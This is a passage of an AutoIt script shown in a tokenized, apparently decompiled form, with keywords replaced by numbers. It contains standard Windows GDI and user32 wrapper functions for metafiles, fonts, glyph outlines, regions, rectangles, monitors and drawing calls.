28$TDATA=65("wchar[4096]")
28$ARET=58("gdi32.dll","uint","GetEnhMetaFileDescriptionW","handle",$HEMF,"uint",4096,"struct*",$TDATA)
4@ERROR2($ARET[0]=4294967295)534287(@ERROR+20,$ARET[0],0)
43$ARET[0]5340
28$ADATA=_WINAPI_STRUCTTOARRAY($TDATA)
4@ERROR534287(@ERROR,@EXTENDED,0)
28$ARESULT[2]
13$I=0151
4$ADATA[0]>$I5
$ARESULT[$I]=$ADATA[$I+1]
6
$ARESULT[$I]=""
8
14
34$ARESULT
33
32_WINAPI_GETENHMETAFILEDIMENSION($HEMF)
28$TENHMETAHEADER=_WINAPI_GETENHMETAFILEHEADER($HEMF)
4@ERROR534287(@ERROR,@EXTENDED,0)
28$TSIZE=65($TAGSIZE)
69($TSIZE,1,280((66($TENHMETAHEADER,"rcFrame",3)-66($TENHMETAHEADER,"rcFrame",1))*66($TENHMETAHEADER,"Device",1)/66($TENHMETAHEADER,"Millimeters",1)/100))
69($TSIZE,2,280((66($TENHMETAHEADER,"rcFrame",4)-66($TENHMETAHEADER,"rcFrame",2))*66($TENHMETAHEADER,"Device",2)/66($TENHMETAHEADER,"Millimeters",2)/100))
34$TSIZE
33
32_WINAPI_GETENHMETAFILEHEADER($HEMF)
28$TENHMETAHEADER=65($TAGENHMETAHEADER)
28$ARET=58("gdi32.dll","uint","GetEnhMetaFileHeader","handle",$HEMF,"uint",68($TENHMETAHEADER),"struct*",$TENHMETAHEADER)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34288($ARET[0],$TENHMETAHEADER)
33
32_WINAPI_GETFONTNAME($SFACENAME,$ISTYLE=0,$ICHARSET=1)
43$SFACENAME534287(1,0,"")
28$IFLAGS=0
417($ISTYLE,1)5
$IFLAGS+=32
8
417($ISTYLE,2)5
$IFLAGS+=1
8
43$IFLAGS5
$IFLAGS=64
8
28$TLOGFONT=65($TAGLOGFONT)
69($TLOGFONT,9,$ICHARSET)
69($TLOGFONT,13,0)
69($TLOGFONT,14,322($SFACENAME,31))
28$TFN=65("dword;wchar[64]")
69($TFN,1,$IFLAGS)
69($TFN,2,"")
28$HDC=_WINAPI_CREATECOMPATIBLEDC(0)
28$HENUMPROC=62("__EnumFontStylesProc","int","ptr;ptr;dword;lparam")
28$SRET=""
28$ARET=58("gdi32.dll","int","EnumFontFamiliesExW","handle",$HDC,"struct*",$TLOGFONT,"ptr",61($HENUMPROC),"struct*",$TFN,"dword",0)
43@ERROR13$ARET[0]5$SRET=66($TFN,2)
60($HENUMPROC)
_WINAPI_DELETEDC($HDC)
43$SRET534287(2,0,"")
34$SRET
33
32_WINAPI_GETFONTRESOURCEINFO($SFONT,$BFORCE=40,$IFLAG=41)
4$IFLAG=415
4$BFORCE5
43_WINAPI_ADDFONTRESOURCEEX($SFONT,$FR_NOT_ENUM)534287(@ERROR+20,@EXTENDED,"")
8
28$IERROR=0
28$ARET=58("gdi32.dll","bool","GetFontResourceInfoW","wstr",$SFONT,"dword*",4096,"wstr","","dword",1)
4@ERROR23$ARET[0]5$IERROR=@ERROR+10
4$BFORCE5
_WINAPI_REMOVEFONTRESOURCEEX($SFONT,$FR_NOT_ENUM)
8
4$IERROR534287($IERROR,0,"")
34$ARET[3]
6
4395($SFONT)5
$SFONT=278("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders","Fonts")&"\"&$SFONT
4395($SFONT)534287(31,0,"")
8
2830$HFILE=_WINAPI_CREATEFILE($SFONT,2,2,2)
43$HFILE534287(32,_WINAPI_GETLASTERROR(),"")
2830$IFILE=105($SFONT)
2830$TBUFFER=65("byte["&$IFILE+1&"]")
2830$PFILE=67($TBUFFER)
28$IREAD
_WINAPI_READFILE($HFILE,$PFILE,$IFILE,$IREAD)
_WINAPI_CLOSEHANDLE($HFILE)
28$STTFNAME=_WINAPI_GETFONTMEMORYRESOURCEINFO($PFILE,$IFLAG)
4@ERROR5
4@ERROR=11$IFLAG=45
$STTFNAME=_WINAPI_GETFONTRESOURCEINFO($SFONT,39)
34287(@ERROR,@EXTENDED,$STTFNAME)
8
34287(33,@ERROR,"")
8
34$STTFNAME
8
33
32_WINAPI_GETFONTMEMORYRESOURCEINFO($PMEMORY,$IFLAG=1)
2830$TAGTT_OFFSET_TABLE="USHORT uMajorVersion;USHORT uMinorVersion;USHORT uNumOfTables;USHORT uSearchRange;USHORT uEntrySelector;USHORT uRangeShift"
2830$TAGTT_TABLE_DIRECTORY="char szTag[4];ULONG uCheckSum;ULONG uOffset;ULONG uLength"
2830$TAGTT_NAME_TABLE_HEADER="USHORT uFSelector;USHORT uNRCount;USHORT uStorageOffset"
2830$TAGTT_NAME_RECORD="USHORT uPlatformID;USHORT uEncodingID;USHORT uLanguageID;USHORT uNameID;USHORT uStringLength;USHORT uStringOffset"
28$TTTOFFSETTABLE=65($TAGTT_OFFSET_TABLE,$PMEMORY)
28$INUMOFTABLES=_WINAPI_SWAPWORD(66($TTTOFFSETTABLE,"uNumOfTables"))
43(_WINAPI_SWAPWORD(66($TTTOFFSETTABLE,"uMajorVersion"))=11_WINAPI_SWAPWORD(66($TTTOFFSETTABLE,"uMinorVersion"))=0)534287(1,0,"")
28$ITBLDIRSIZE=68(65($TAGTT_TABLE_DIRECTORY))
28$BFOUND=40,$IOFFSET,$TTBLDIR
13$I=015$INUMOFTABLES-1
$TTBLDIR=65($TAGTT_TABLE_DIRECTORY,$PMEMORY+68($TTTOFFSETTABLE)+$I*$ITBLDIRSIZE)
4322(66($TTBLDIR,"szTag"),4)="name"5
$BFOUND=39
$IOFFSET=_WINAPI_SWAPDWORD(66($TTBLDIR,"uOffset"))
18
8
14
43$BFOUND534287(2,0,"")
28$TNTHEADER=65($TAGTT_NAME_TABLE_HEADER,$PMEMORY+$IOFFSET)
28$INTHEADERSIZE=68($TNTHEADER)
28$INRCOUNT=_WINAPI_SWAPWORD(66($TNTHEADER,"uNRCount"))
28$ISTORAGEOFFSET=_WINAPI_SWAPWORD(66($TNTHEADER,"uStorageOffset"))
28$ITTRECORDSIZE=68(65($TAGTT_NAME_RECORD))
28$TRESULT,$SRESULT,$ISTRINGLENGTH,$ISTRINGOFFSET,$IENCODINGID,$TTTRECORD
13$I=015$INRCOUNT-1
$TTTRECORD=65($TAGTT_NAME_RECORD,$PMEMORY+$IOFFSET+$INTHEADERSIZE+$I*$ITTRECORDSIZE)
4_WINAPI_SWAPWORD($TTTRECORD.uNameID)=$IFLAG5
$ISTRINGLENGTH=_WINAPI_SWAPWORD(66($TTTRECORD,"uStringLength"))
$ISTRINGOFFSET=_WINAPI_SWAPWORD(66($TTTRECORD,"uStringOffset"))
$IENCODINGID=_WINAPI_SWAPWORD(66($TTTRECORD,"uEncodingID"))
28$SWCHAR="char"
4$IENCODINGID=15
$SWCHAR="word"
$ISTRINGLENGTH=$ISTRINGLENGTH/2
8
$TRESULT=65($SWCHAR&" szTTFName["&$ISTRINGLENGTH&"]",$PMEMORY+$IOFFSET+$ISTRINGOFFSET+$ISTORAGEOFFSET)
4$IENCODINGID=15
$SRESULT=""
13$J=115$ISTRINGLENGTH
$SRESULT&=29(_WINAPI_SWAPWORD(66($TRESULT,1,$J)))
14
6
$SRESULT=$TRESULT.szTTFName
8
4323($SRESULT)>0518
8
14
34$SRESULT
33
32_WINAPI_GETGLYPHOUTLINE($HDC,$SCHAR,$IFORMAT,36$PBUFFER,$TMAT2=0)
28$TGM=65($TAGGLYPHMETRICS)
28$ARET,$ILENGTH=0
43223($TMAT2)5
$TMAT2=65("short[8]")
69($TMAT2,1,1,2)
69($TMAT2,1,1,8)
8
4$IFORMAT5
$ARET=58("gdi32.dll","dword","GetGlyphOutlineW","handle",$HDC,"uint",5($SCHAR),"uint",$IFORMAT,"struct*",$TGM,"dword",0,"ptr",0,"struct*",$TMAT2)
4@ERROR2($ARET[0]=4294967295)534287(@ERROR+10,@EXTENDED,0)
$ILENGTH=$ARET[0]
$PBUFFER=__HEAPREALLOC($PBUFFER,$ILENGTH,1)
4@ERROR534287(@ERROR+20,@EXTENDED,0)
8
$ARET=58("gdi32.dll","dword","GetGlyphOutlineW","handle",$HDC,"uint",5($SCHAR),"uint",$IFORMAT,"struct*",$TGM,"dword",$ILENGTH,"ptr",$PBUFFER,"struct*",$TMAT2)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]=4294967295534287(10,-1,0)
34288($ILENGTH,$TGM)
33
32_WINAPI_GETGRAPHICSMODE($HDC)
28$ARET=58("gdi32.dll","int","GetGraphicsMode","handle",$HDC)
4@ERROR23$ARET[0]534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_GETGVALUE($IRGB)
3421(17(__RGB($IRGB),65280),8)
33
32_WINAPI_GETMAPMODE($HDC)
28$ARET=58("gdi32.dll","int","GetMapMode","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_GETMONITORINFO($HMONITOR)
28$TMIEX=65("dword;long[4];long[4];dword;wchar[32]")
69($TMIEX,1,68($TMIEX))
28$ARET=58("user32.dll","bool","GetMonitorInfoW","handle",$HMONITOR,"struct*",$TMIEX)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
28$ARESULT[4]
13$I=0151
$ARESULT[$I]=65($TAGRECT)
_WINAPI_MOVEMEMORY($ARESULT[$I],67($TMIEX,$I+2),16)
14
$ARESULT[3]=66($TMIEX,5)
2366($TMIEX,4)
211
$ARESULT[2]=1
216
$ARESULT[2]=0
24
34$ARESULT
33
32_WINAPI_GETOUTLINETEXTMETRICS($HDC)
28$ARET=58("gdi32.dll","uint","GetOutlineTextMetricsW","handle",$HDC,"uint",0,"ptr",0)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
28$TDATA=65("byte["&$ARET[0]&"]")
28$TOLTM=65($TAGOUTLINETEXTMETRIC,67($TDATA))
$ARET=58("gdi32.dll","uint","GetOutlineTextMetricsW","handle",$HDC,"uint",$ARET[0],"struct*",$TDATA)
43$ARET[0]534287(20,0,0)
34$TOLTM
33
32_WINAPI_GETPIXEL($HDC,$IX,$IY)
28$ARET=58("gdi32.dll","dword","GetPixel","handle",$HDC,"int",$IX,"int",$IY)
4@ERROR2($ARET[0]=4294967295)534287(@ERROR,@EXTENDED,-1)
34__RGB($ARET[0])
33
32_WINAPI_GETPOLYFILLMODE($HDC)
28$ARET=58("gdi32.dll","int","GetPolyFillMode","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_GETPOSFROMRECT($TRECT)
28$ARESULT[4]
13$I=0153
$ARESULT[$I]=66($TRECT,$I+1)
4@ERROR534287(@ERROR,@EXTENDED,0)
14
13$I=2153
$ARESULT[$I]-=$ARESULT[$I-2]
14
34$ARESULT
33
32_WINAPI_GETREGIONDATA($HRGN,36$TRGNDATA)
28$ARET=58("gdi32.dll","dword","GetRegionData","handle",$HRGN,"dword",0,"ptr",0)
4@ERROR23$ARET[0]5
$TRGNDATA=0
34287(@ERROR,@EXTENDED,40)
8
$TRGNDATA=65($TAGRGNDATAHEADER)
28$IRECTSIZE=$ARET[0]-68($TRGNDATA)
4$IRECTSIZE>05$TRGNDATA=65($TAGRGNDATAHEADER&";byte["&$IRECTSIZE&"]")
$ARET=58("gdi32.dll","dword","GetRegionData","handle",$HRGN,"dword",$ARET[0],"struct*",$TRGNDATA)
43$ARET[0]5$TRGNDATA=0
34$ARET[0]
33
32_WINAPI_GETRGNBOX($HRGN,36$TRECT)
$TRECT=65($TAGRECT)
28$ARET=58("gdi32.dll","int","GetRgnBox","handle",$HRGN,"struct*",$TRECT)
4@ERROR23$ARET[0]5
$TRECT=0
34287(@ERROR,@EXTENDED,0)
8
34$ARET[0]
33
32_WINAPI_GETROP2($HDC)
28$ARET=58("gdi32.dll","int","GetROP2","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_GETRVALUE($IRGB)
3417(__RGB($IRGB),255)
33
32_WINAPI_GETSTRETCHBLTMODE($HDC)
28$ARET=58("gdi32.dll","int","GetStretchBltMode","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_GETTABBEDTEXTEXTENT($HDC,$STEXT,$ATAB=0,$ISTART=0,$IEND=-1)
28$ITAB,$ICOUNT
43219($ATAB)5
4$ATAB5
$ITAB=$ATAB
26$ATAB[1]=[$ITAB]
$ISTART=0
$IEND=0
$ICOUNT=1
6
$ICOUNT=0
8
6
$ICOUNT=1
8
28$TTAB=0
4$ICOUNT5
4__CHECKERRORARRAYBOUNDS($ATAB,$ISTART,$IEND)534287(@ERROR+10,@EXTENDED,0)
$ICOUNT=$IEND-$ISTART+1
$TTAB=65("uint["&$ICOUNT&"]")
$ITAB=1
13$I=$ISTART15$IEND
69($TTAB,1,$ATAB[$I],$ITAB)
$ITAB+=1
14
8
28$ARET=58("user32.dll","dword","GetTabbedTextExtentW","handle",$HDC,"wstr",$STEXT,"int",323($STEXT),"int",$ICOUNT,"struct*",$TTAB)
4@ERROR23$ARET[0]534287(@ERROR+20,@EXTENDED,0)
34_WINAPI_CREATESIZE(_WINAPI_LOWORD($ARET[0]),_WINAPI_HIWORD($ARET[0]))
33
32_WINAPI_GETTEXTALIGN($HDC)
28$ARET=58("gdi32.dll","uint","GetTextAlign","handle",$HDC)
4@ERROR2($ARET[0]=4294967295)534287(@ERROR,@EXTENDED,-1)
34$ARET[0]
33
32_WINAPI_GETTEXTCHARACTEREXTRA($HDC)
28$ARET=58("gdi32.dll","int","GetTextCharacterExtra","handle",$HDC)
4@ERROR2($ARET[0]=134217728)534287(@ERROR,@EXTENDED,-1)
34$ARET[0]
33
32_WINAPI_GETTEXTFACE($HDC)
28$ARET=58("gdi32.dll","int","GetTextFaceW","handle",$HDC,"int",2048,"wstr","")
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,"")
34$ARET[3]
33
32_WINAPI_GETUDFCOLORMODE()
34250($__G_IRGBMODE)
33
32_WINAPI_GETUPDATERECT($HWND,$BERASE=39)
28$TRECT=65($TAGRECT)
28$ARET=58("user32.dll","bool","GetUpdateRect","hwnd",$HWND,"struct*",$TRECT,"bool",$BERASE)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34$TRECT
33
32_WINAPI_GETUPDATERGN($HWND,$HRGN,$BERASE=39)
28$ARET=58("user32.dll","int","GetUpdateRgn","hwnd",$HWND,"handle",$HRGN,"bool",$BERASE)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_GETWINDOWEXT($HDC)
28$TSIZE=65($TAGSIZE)
28$ARET=58("gdi32.dll","bool","GetWindowExtEx","handle",$HDC,"struct*",$TSIZE)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34$TSIZE
33
32_WINAPI_GETWINDOWORG($HDC)
28$TPOINT=65($TAGPOINT)
28$ARET=58("gdi32.dll","bool","GetWindowOrgEx","handle",$HDC,"struct*",$TPOINT)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34$TPOINT
33
32_WINAPI_GETWINDOWRGNBOX($HWND,36$TRECT)
$TRECT=65($TAGRECT)
28$ARET=58("gdi32.dll","int","GetWindowRgnBox","hwnd",$HWND,"struct*",$TRECT)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_GETWORLDTRANSFORM($HDC)
28$TXFORM=65($TAGXFORM)
28$ARET=58("gdi32.dll","bool","GetWorldTransform","handle",$HDC,"struct*",$TXFORM)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34$TXFORM
33
32_WINAPI_GRADIENTFILL($HDC,3036$AVERTEX,$ISTART=0,$IEND=-1,$BROTATE=40)
4__CHECKERRORARRAYBOUNDS($AVERTEX,$ISTART,$IEND,2)534287(@ERROR+10,@EXTENDED,0)
4369($AVERTEX,$UBOUND_COLUMNS)<3534287(13,0,0)
28$IPOINT=$IEND-$ISTART+1
4$IPOINT>35
$IEND=$ISTART+2
$IPOINT=3
8
28$IMODE
23$IPOINT
212
$IMODE=250(3$BROTATE)
213
$IMODE=2
216
34287(15,0,0)
24
28$TAGSTRUCT=""
13$I=$ISTART15$IEND
$TAGSTRUCT&="ushort[8];"
14
28$TVERTEX=65($TAGSTRUCT)
28$ICOUNT=1
28$TGRADIENT=65("ulong["&$IPOINT&"]")
13$I=$ISTART15$IEND
69($TGRADIENT,1,$ICOUNT-1,$ICOUNT)
69($TVERTEX,$ICOUNT,_WINAPI_LOWORD($AVERTEX[$I][0]),1)
69($TVERTEX,$ICOUNT,_WINAPI_HIWORD($AVERTEX[$I][0]),2)
69($TVERTEX,$ICOUNT,_WINAPI_LOWORD($AVERTEX[$I][1]),3)
69($TVERTEX,$ICOUNT,_WINAPI_HIWORD($AVERTEX[$I][1]),4)
69($TVERTEX,$ICOUNT,21(_WINAPI_GETRVALUE($AVERTEX[$I][2]),-8),5)
69($TVERTEX,$ICOUNT,21(_WINAPI_GETGVALUE($AVERTEX[$I][2]),-8),6)
69($TVERTEX,$ICOUNT,21(_WINAPI_GETBVALUE($AVERTEX[$I][2]),-8),7)
69($TVERTEX,$ICOUNT,0,8)
$ICOUNT+=1
14
28$ARET=58("gdi32.dll","bool","GdiGradientFill","handle",$HDC,"struct*",$TVERTEX,"ulong",$IPOINT,"struct*",$TGRADIENT,"ulong",1,"ulong",$IMODE)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_INFLATERECT(36$TRECT,$IDX,$IDY)
28$ARET=58("user32.dll","bool","InflateRect","struct*",$TRECT,"int",$IDX,"int",$IDY)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_INTERSECTCLIPRECT($HDC,$TRECT)
28$ARET=58("gdi32.dll","int","IntersectClipRect","handle",$HDC,"int",66($TRECT,1),"int",66($TRECT,2),"int",66($TRECT,3),"int",66($TRECT,4))
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_INTERSECTRECT($TRECT1,$TRECT2)
28$TRECT=65($TAGRECT)
28$ARET=58("user32.dll","bool","IntersectRect","struct*",$TRECT,"struct*",$TRECT1,"struct*",$TRECT2)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34$TRECT
33
32_WINAPI_INVALIDATERGN($HWND,$HRGN=0,$BERASE=39)
28$ARET=58("user32.dll","bool","InvalidateRgn","hwnd",$HWND,"handle",$HRGN,"bool",$BERASE)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_INVERTANDBITMAP($HBITMAP,$BDELETE=40)
28$TBITMAP=65($TAGBITMAP)
43_WINAPI_GETOBJECT($HBITMAP,68($TBITMAP),$TBITMAP)2(66($TBITMAP,"bmBitsPixel")<>1)5
34287(@ERROR+10,@EXTENDED,0)
8
28$HRESULT=_WINAPI_CREATEDIB(66($TBITMAP,"bmWidth"),66($TBITMAP,"bmHeight"),1)
43$HRESULT534287(@ERROR,@EXTENDED,0)
28$HSRCDC=_WINAPI_CREATECOMPATIBLEDC(0)
28$HSRCSV=_WINAPI_SELECTOBJECT($HSRCDC,$HBITMAP)
28$HDSTDC=_WINAPI_CREATECOMPATIBLEDC(0)
28$HDSTSV=_WINAPI_SELECTOBJECT($HDSTDC,$HRESULT)
_WINAPI_BITBLT($HDSTDC,0,0,66($TBITMAP,"bmWidth"),66($TBITMAP,"bmHeight"),$HSRCDC,0,0,3342344)
_WINAPI_SELECTOBJECT($HSRCDC,$HSRCSV)
_WINAPI_DELETEDC($HSRCDC)
_WINAPI_SELECTOBJECT($HDSTDC,$HDSTSV)
_WINAPI_DELETEDC($HDSTDC)
4$BDELETE5
_WINAPI_DELETEOBJECT($HBITMAP)
8
34$HRESULT
33
32_WINAPI_INVERTCOLOR($ICOLOR)
4$ICOLOR=-15340
3416777215-17($ICOLOR,16777215)
33
32_WINAPI_INVERTRECT($HDC,36$TRECT)
28$ARET=58("user32.dll","bool","InvertRect","handle",$HDC,"struct*",$TRECT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_INVERTRGN($HDC,$HRGN)
28$ARET=58("gdi32.dll","bool","InvertRgn","handle",$HDC,"handle",$HRGN)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_ISRECTEMPTY(36$TRECT)
28$ARET=58("user32.dll","bool","IsRectEmpty","struct*",$TRECT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_LINEDDA($IX1,$IY1,$IX2,$IY2,$PLINEPROC,$PDATA=0)
28$ARET=58("gdi32.dll","bool","LineDDA","int",$IX1,"int",$IY1,"int",$IX2,"int",$IY2,"ptr",$PLINEPROC,"lparam",$PDATA)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_LINETO($HDC,$IX,$IY)
28$ARESULT=58("gdi32.dll","bool","LineTo","handle",$HDC,"int",$IX,"int",$IY)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_LOCKWINDOWUPDATE($HWND)
28$ARET=58("user32.dll","bool","LockWindowUpdate","hwnd",$HWND)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_LPTODP($HDC,36$TPOINT,$ICOUNT=1)
28$ARET=58("gdi32.dll","bool","LPtoDP","handle",$HDC,"struct*",$TPOINT,"int",$ICOUNT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_MASKBLT($HDESTDC,$IXDEST,$IYDEST,$IWIDTH,$IHEIGHT,$HSRCDC,$IXSRC,$IYSRC,$HMASK,$IXMASK,$IYMASK,$IROP)
28$ARET=58("gdi32.dll","bool","MaskBlt","handle",$HDESTDC,"int",$IXDEST,"int",$IYDEST,"int",$IWIDTH,"int",$IHEIGHT,"hwnd",$HSRCDC,"int",$IXSRC,"int",$IYSRC,"handle",$HMASK,"int",$IXMASK,"int",$IYMASK,"dword",$IROP)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_MODIFYWORLDTRANSFORM($HDC,36$TXFORM,$IMODE)
28$ARET=58("gdi32.dll","bool","ModifyWorldTransform","handle",$HDC,"struct*",$TXFORM,"dword",$IMODE)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_MONITORFROMPOINT(36$TPOINT,$IFLAG=1)
468($TPOINT)<>8534287(@ERROR+10,@EXTENDED,0)
28$ARET=58("user32.dll","handle","MonitorFromPoint","struct",$TPOINT,"dword",$IFLAG)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_MONITORFROMRECT(36$TRECT,$IFLAG=1)
28$ARET=58("user32.dll","ptr","MonitorFromRect","struct*",$TRECT,"dword",$IFLAG)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_MONITORFROMWINDOW($HWND,$IFLAG=1)
28$ARET=58("user32.dll","handle","MonitorFromWindow","hwnd",$HWND,"dword",$IFLAG)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_MOVETO($HDC,$IX,$IY)
28$ARESULT=58("gdi32.dll","bool","MoveToEx","handle",$HDC,"int",$IX,"int",$IY,"ptr",0)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_MOVETOEX($HDC,$IX,$IY)
28$TPOINT=65($TAGPOINT)
28$ARET=58("gdi32.dll","bool","MoveToEx","handle",$HDC,"int",$IX,"int",$IY,"struct*",$TPOINT)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34$TPOINT
33
32_WINAPI_OFFSETCLIPRGN($HDC,$IXOFFSET,$IYOFFSET)
28$ARET=58("gdi32.dll","int","OffsetClipRgn","handle",$HDC,"int",$IXOFFSET,"int",$IYOFFSET)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_OFFSETPOINTS(36$APOINT,$IXOFFSET,$IYOFFSET,$ISTART=0,$IEND=-1)
4__CHECKERRORARRAYBOUNDS($APOINT,$ISTART,$IEND,2)534287(@ERROR+10,@EXTENDED,0)
4369($APOINT,$UBOUND_COLUMNS)<2534287(13,0,0)
13$I=$ISTART15$IEND
$APOINT[$I][0]+=$IXOFFSET
$APOINT[$I][1]+=$IYOFFSET
14
341
33
32_WINAPI_OFFSETRECT(36$TRECT,$IDX,$IDY)
28$ARET=58("user32.dll","bool","OffsetRect","struct*",$TRECT,"int",$IDX,"int",$IDY)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_OFFSETRGN($HRGN,$IXOFFSET,$IYOFFSET)
28$ARET=58("gdi32.dll","int","OffsetRgn","handle",$HRGN,"int",$IXOFFSET,"int",$IYOFFSET)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_OFFSETWINDOWORG($HDC,$IXOFFSET,$IYOFFSET)
$__G_VEXT=65($TAGPOINT)
28$ARET=58("gdi32.dll","bool","OffsetWindowOrgEx","handle",$HDC,"int",$IXOFFSET,"int",$IYOFFSET,"struct*",$__G_VEXT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_PAINTDESKTOP($HDC)
28$ARET=58("user32.dll","bool","PaintDesktop","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_PAINTRGN($HDC,$HRGN)
28$ARET=58("gdi32.dll","bool","PaintRgn","handle",$HDC,"handle",$HRGN)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_PATBLT($HDC,$IX,$IY,$IWIDTH,$IHEIGHT,$IROP)
28$ARET=58("gdi32.dll","bool","PatBlt","handle",$HDC,"int",$IX,"int",$IY,"int",$IWIDTH,"int",$IHEIGHT,"dword",$IROP)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_PATHTOREGION($HDC)
28$ARET=58("gdi32.dll","handle","PathToRegion","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_PLAYENHMETAFILE($HDC,$HEMF,36$TRECT)
28$ARET=58("gdi32.dll","bool","PlayEnhMetaFile","handle",$HDC,"handle",$HEMF,"struct*",$TRECT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_PLGBLT($HDESTDC,3036$APOINT,$HSRCDC,$IXSRC,$IYSRC,$IWIDTH,$IHEIGHT,$HMASK=0,$IXMASK=0,$IYMASK=0)
4(369($APOINT)<3)2(369($APOINT,$UBOUND_COLUMNS)<2)534287(12,0,40)
28$TPOINTS=65("long[2];long[2];long[2]")
13$I=0152
13$J=0151
69($TPOINTS,$I+1,$APOINT[$I][$J],$J+1)
14
14
28$ARET=58("gdi32.dll","bool","PlgBlt","handle",$HDESTDC,"struct*",$TPOINTS,"handle",$HSRCDC,"int",$IXSRC,"int",$IYSRC,"int",$IWIDTH,"int",$IHEIGHT,"handle",$HMASK,"int",$IXMASK,"int",$IYMASK)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_POLYBEZIER($HDC,3036$APOINT,$ISTART=0,$IEND=-1)
4__CHECKERRORARRAYBOUNDS($APOINT,$ISTART,$IEND,2,2)534287(@ERROR+10,@EXTENDED,40)
28$IPOINT=1+3*125(($IEND-$ISTART)/3)
4$IPOINT<1534287(15,0,40)
$IEND=$ISTART+$IPOINT-1
28$TAGSTRUCT=""
13$I=$ISTART15$IEND
$TAGSTRUCT&="long[2];"
14
28$TPOINT=65($TAGSTRUCT)
28$ICOUNT=0
13$I=$ISTART15$IEND
$ICOUNT+=1
13$J=0151
69($TPOINT,$ICOUNT,$APOINT[$I][$J],$J+1)
14
14
28$ARET=58("gdi32.dll","bool","PolyBezier","handle",$HDC,"struct*",$TPOINT,"dword",$IPOINT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_POLYBEZIERTO($HDC,3036$APOINT,$ISTART=0,$IEND=-1)
4__CHECKERRORARRAYBOUNDS($APOINT,$ISTART,$IEND,2,2)534287(@ERROR+10,@EXTENDED,40)
28$IPOINT=3*125(($IEND-$ISTART+1)/3)
4$IPOINT<3534287(15,0,40)
$IEND=$ISTART+$IPOINT-1
28$TAGSTRUCT=""
13$I=$ISTART15$IEND
$TAGSTRUCT&="long[2];"
14
28$TPOINT=65($TAGSTRUCT)
28$ICOUNT=0
13$I=$ISTART15$IEND
$ICOUNT+=1
13$J=0151
69($TPOINT,$ICOUNT,$APOINT[$I][$J],$J+1)
14
14
28$ARET=58("gdi32.dll","bool","PolyBezierTo","handle",$HDC,"struct*",$TPOINT,"dword",$IPOINT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_POLYDRAW($HDC,3036$APOINT,$ISTART=0,$IEND=-1)
4__CHECKERRORARRAYBOUNDS($APOINT,$ISTART,$IEND,2)534287(@ERROR+10,@EXTENDED,0)
4369($APOINT,$UBOUND_COLUMNS)<3534287(13,0,40)
28$IPOINT=$IEND-$ISTART+1
28$TAGSTRUCT=""
13$I=$ISTART15$IEND
$TAGSTRUCT&="long[2];"
14
28$TPOINT=65($TAGSTRUCT)
28$TTYPES=65("byte["&$IPOINT&"]")
28$ICOUNT=0
